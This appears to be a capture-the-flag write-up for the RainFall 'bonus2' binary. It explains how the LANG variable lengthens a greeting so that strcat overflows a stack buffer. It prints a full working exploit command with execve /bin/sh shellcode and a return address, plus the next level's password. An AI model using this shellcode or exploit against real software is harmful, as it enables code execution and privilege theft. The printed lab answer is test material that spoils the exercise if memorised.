# Bonus2 Write-up: Multi-Stage Buffer Overflow & Environment Manipulation

## 1. Code Analysis: Understanding the Input Flow

To exploit `bonus2`, we first must understand how it processes our input across its two main functions: `main` and `greetuser`.

### The `main` Function

By analyzing the assembly of `main`, we observe the following behavior:

1. **Argument Check:** The program expects exactly two arguments (`argc == 3`).
2. **Buffer Initialization:** It allocates a 76-byte buffer on the stack and zeros it out using a `memset`-like operation (`rep stos`).
3. **Safe Copying:** It uses `strncpy` to safely copy our arguments into this buffer:
* Copies up to **40 bytes** of `argv[1]` into the start of the buffer.
* Copies up to **32 bytes** of `argv[2]` into the buffer at an offset of 40 (`buffer + 40`).


4. **Environment Check:** It reads the `LANG` environment variable.
* If `LANG` starts with `"fi"`, it sets a global variable to 1.
* If `LANG` starts with `"nl"`, it sets the global variable to 2.


5. **Function Call:** It passes the concatenated 72-byte buffer by value to `greetuser()`.

### The `greetuser` Function (The Vulnerability)

Inside `greetuser`, the program allocates a local buffer of 72 bytes (`ebp-0x48`).

```assembly
0x08048487 <+3>:      sub    esp,0x58      ; Reserves 88 bytes on the stack
...
0x080484a2 <+30>:     lea    eax,[ebp-0x48] ; Local string buffer (size = 72 bytes)

```

Depending on the global variable set by `LANG`, it copies a specific greeting prefix into this local buffer:

* Mode 1 (`"fi"`): `"Hyvää päivää "` (18 bytes)
* Mode 2 (`"nl"`): `"Goedemiddag! "` (13 bytes)
* Default: `"Hello "` (6 bytes)

Finally, it calls `strcat(greeting, input)`.

**The Flaw:** `strcat` does not check the bounds of the destination buffer. If the combined length of the greeting prefix and our input exceeds the 72-byte local buffer, it will overflow into adjacent stack memory, allowing us to overwrite the Instruction Pointer (EIP).

---

## 2. The Exploit Strategy: The Math Behind the Crash

Our goal is to overwrite the EIP. Since the local buffer starts at `ebp-0x48` (72 bytes), and the EIP is located at `ebp+4`, the exact distance from the start of the buffer to the EIP is **76 bytes**.

We have two constraints:

1. Our input is split across two arguments: max 40 bytes (`argv[1]`) and max 32 bytes (`argv[2]`).
2. We must prefix our input with one of the greetings.

### Why the Language Trick is Mandatory

If we use the default `"Hello "` prefix (6 bytes), the maximum length we can write is:
```txt
    6(prefix) + 40 (argv[1]) + 32 (argv[2]) = 78 bytes.
```
This only overwrites 2 bytes of the EIP (at offset 76), which is insufficient for an exploit.

To push our payload far enough down the stack, we **must** use the longest prefix: `"Hyvää päivää "` (18 bytes). By exporting `LANG="fi"`, we increase our maximum write capacity to:
```txt
18 + 40 + 32 = 90bytes, giving us plenty of room to completely control the EIP.
```
### Calculating the Offsets

We need exactly 76 bytes of data before we drop our target return address. Let's calculate the payload structure:

1. **The Prefix:** `"Hyvää päivää "` **18 bytes**.
2. **Argument 1:** We fill the maximum allowed space with a NOP sled and our 23-byte shellcode.
* $40 - 23 (shellcode) = 17 NOPs$.
* Total **40 bytes**.


3. **Current Buffer Length:** $18 + 40 = 58 bytes$.
4. **Argument 2 Padding:** To reach the EIP at offset 76, we need:
* $76 - 58 = 18 bytes of padding$.


5. **The Overwrite:** We place our target memory address immediately after the 18 bytes of padding.


## 3. Dealing with Environment Shifts

During testing, we extracted an address from GDB (e.g., `0xbffff618`). However, because we modified the `LANG` environment variable to `"fiXxxxxxxD"`, the size of the environment variables residing at the top of the stack changed.

This alteration shifts the entire stack up or down natively. Because our NOP sled is relatively small (17 bytes), even a slight modification to the `LANG` variable length requires us to extract a fresh, native core-dump address or carefully tune the offset to match the new stack alignment.

## 4. Execution

We execute the exploit natively by setting the environment variable and passing the carefully crafted arguments.

**1. Set the Environment:**

```bash
bonus2@RainFall:~$ export LANG="fi"

```

**2. Construct the Payload:**

* `argv[1]`: 17 NOPs + 23-byte Shellcode
* `argv[2]`: 18 `"a"`s + Target Address (`\x18\xf6\xff\xbf`)

**3. Fire the Exploit:**

```bash
bonus2@RainFall:~$ ./bonus2 $(python2 -c 'print "\x90"*(40-23)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"') $(python2 -c 'print "a"*18+"\x18\xf6\xff\xbf"')

```

**result:**

```sh
bonus2@RainFall:~$ ./bonus2 $(python2 -c 'print "\x90"*(40-23)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"') $(python2 -c 'print "aaaaaaaaaaaaaaaaaa"+"\x18\xf6\xff\xbf"')
Hyvää päivää �����������������1�Ph//shh/bin��1�1Ұ
                                                 ̀aaaaaaaaaaaaaaaaaa���
$ ls
ls: cannot open directory .: Permission denied
$ whoami
bonus3
$ cd /home/user/bonus3
$ cat .pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

By leveraging the `LANG` variable to manipulate the `strcat` prefix length, we successfully bridged the gap to the EIP and hijacked the execution flow.
